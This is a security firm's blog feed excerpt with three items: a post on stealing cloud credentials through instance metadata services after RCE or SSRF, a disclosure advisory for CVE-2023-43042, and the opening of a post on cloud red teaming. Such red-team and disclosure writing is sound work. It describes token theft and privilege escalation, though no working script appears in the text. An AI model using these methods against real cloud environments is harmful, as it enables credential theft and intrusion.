&lt;p&gt;In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found &lt;a href=&#34;https://labs.jumpsec.com/butting-heads-with-a-threat-actor-on-an-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud-Hosted&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-hosted&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-hosted&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch &lt;a href=&#34;https://www.youtube.com/watch?v=OaG6wHlhbCQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks”&lt;/em&gt; - Risk3Sixty&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Here, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this &lt;a href=&#34;http://169.254.169.254&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://169.254.169.254&lt;/a&gt;, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Cloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;With the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;AWS&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 1:  401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 2: Bash script for gaining access to IMDSv2 &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-2-bash-script-for-gaining-access-to-imdsv2&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-2-bash-script-for-gaining-access-to-imdsv2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 3: EC2 Security Credentials requested&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-3-ec2-security-credentials-requested&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-3-ec2-security-credentials-requested&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Azure&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 5: Metadata being returned from Azure Metadata Service endpoint&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 6: Session token returned for the VM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-6-session-token-returned-for-the-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-6-session-token-returned-for-the-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-app-service&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 7: Authenticating to the cloud environment as the compromised Azure VM. &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;For example, having authenticated to the cloud environment you now have an &lt;em&gt;incredibly&lt;/em&gt; rich API at your disposal to begin looking for further vulnerabilities. This could include simply running  ‘&lt;em&gt;Get-AzResource&lt;/em&gt;’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 8: The compromised application has access to a KeyVault&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-8-the-compromised-application-has-access-to-a-keyvault&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-8-the-compromised-application-has-access-to-a-keyvault&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;But wait there&amp;rsquo;s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud Permissions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-permissions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-permissions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a &lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;look&lt;/a&gt; at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read &lt;a href=&#34;https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;The above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in &lt;em&gt;other&lt;/em&gt; cloud environments beyond just the tenant you are in…but that is a topic for another day.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Serverless Functions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;serverless-functions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#serverless-functions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</link>
      <pubDate>Thu, 21 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; 8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/support/pages/node/7064976&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.ibm.com/support/pages/node/7064976&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-43042&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 08/12/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.0 Score:&lt;/strong&gt; 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Max Corbridge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC’s Head of Adversarial Simulation (&lt;a href=&#34;https://twitter.com/CorbridgeMax&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@CorbridgeMax&lt;/a&gt;) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. &lt;/p&gt;
&lt;p&gt;This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IBM web servers related to backup/storage products respond to unauthenticated GET requests to the &lt;em&gt;/login&lt;/em&gt; page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Strict-Transport-Security: max-age=778000; includeSubDomains
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Pragma: no-cache
X-Content-Type-Options: nosniff
SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax
SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure
X-FRAME-OPTIONS: DENY
Cache-Control: post-check=0, pre-check=0
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Fri, 08 Sep 2023 12:28:27 GMT
Connection: close
Content-Length: 70858



&amp;lt;!DOCTYPE html&amp;gt;

&amp;lt;html&amp;gt;
[SNIPPED_FOR_BREVITY]
&amp;#34;superuserPasswordChanged&amp;#34;:true,&amp;#34;hasEnvironmentals&amp;#34;:true,
[SNIPPED_FOR_BREVITY]
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Figure 1: HTTP Response from IBM FlashSystem Webserver&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a priority, change the superuser password if it is still set to the default.&lt;/p&gt;
&lt;p&gt;IBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.2.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.0.2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.5.0.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.4.0.12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.3.1.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Please note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program&lt;/p&gt;
&lt;p&gt;13/12/2023: Vulnerability remediated and public notice created by IBM.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Red Teaming the Cloud: A Shift in Perspective</title>
      <link>//localhost:1313/articles/2023/12/2023-12-19-red-teaming-the-cloud-a-shift-in-perspective/</link>
      <pubDate>Tue, 19 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-19-red-teaming-the-cloud-a-shift-in-perspective/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cloud adoption is exploding, and rightfully so. Businesses are seeing the value of improved agility and efficiency when leveraging public cloud, resulting in 60% of all corporate data globally being stored in the cloud in 2022. As such, securing the cloud is becoming an increasingly important skill for defensive security teams, ergo red teaming the cloud is becoming increasingly important for us offensive security teams too.&lt;/p&gt;
&lt;p&gt;Whilst on-premise red teaming is a rich, documented and well-understood topic, cloud red teaming is still in its infancy. This blog post will highlight some of the biggest differences between on-premise and cloud red teaming, and how red teamers must shift their perspective in the newest security frontier: the cloud. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Initial Compromise&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One element that remains the same from on-premise to the cloud is that almost all attack paths start with the initial compromise of ‘something’ in the target environment. In fact, that ‘something’ remains largely unchanged: staff members, externally facing assets and exposed data. The first major difference is the end-goal after having achieved this initial compromise: whilst traditional red teaming would see you introduce malware, such as a C2 implant in most cases, cloud red teaming often focuses on obtaining a target’s access tokens or credentials. &lt;/p&gt;
&lt;p&gt;Access ‘tokens’ in Azure or ‘keys’ in AWS both serve the purpose of allowing remote attackers to begin interacting with the cloud estate via portals or APIs, which is where much of the battle will be fought. Whilst this can indeed be obtained through remote code execution (RCE) on a machine in most cases, there are alternative (usually easier) methods such as google dorking for leaked keys or social engineering targeting authentication flows.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Getting to your goal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In traditional on-premise environments, attackers seek to obtain credentials and exploit vulnerabilities to move laterally and escalate privileges within the local network. Lateral movement and privilege escalation often involves techniques like credential dumping, exploiting misconfigurations and taking control of increasingly privileged machines and user accounts. Persistence often involves the deployment of malware and mechanisms to keep them alive. &lt;/p&gt;
&lt;p&gt;In cloud environments, the focus shifts towards the compromise of identities, which means attackers primarily aim to compromise user accounts or service principal identities in the target tenant. Many traditional on-premise attack vectors that rely on local network access are not applicable in cloud red teaming scenarios.&lt;/p&gt;
&lt;p&gt;In this case, privilege escalation and persistence can be achieved by compromising other cloud-based identities and their associated permissions. In our experience, whilst many traditional on-premise attack paths require obtaining ‘superuser’ (namely domain administrator) permissions, this is not as often the case in the cloud. We believe this is due to the complexity of, and thereby lack of familiarity with, cloud-based access control permissions leading to access control gaps arising more often. With vendors rightfully advertising least privilege and zero-trust architectures, roles can be assigned with far more granularity. However, with granularity comes greater complexity and administrators sometimes (often) refrain from diving into the documentation to truly understand the permissions needed, resulting in overly permissive accounts.&lt;/p&gt;
&lt;p&gt;Crucially, one of the biggest differences between on-premise and cloud here is that we are typically looking to abuse default configurations or ‘abuse primitives’, as opposed to finding exploits in the cloud platform. The many reasons why this is the case is beyond the scope of this blog post, but an incredibly interesting topic for discussion. Finally, internal phishing using cloud services is often used to gain elevated privileges and, in our experience, used much more often than in on-premise engagements.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mining for Data&lt;/strong&gt;&lt;/p&gt;
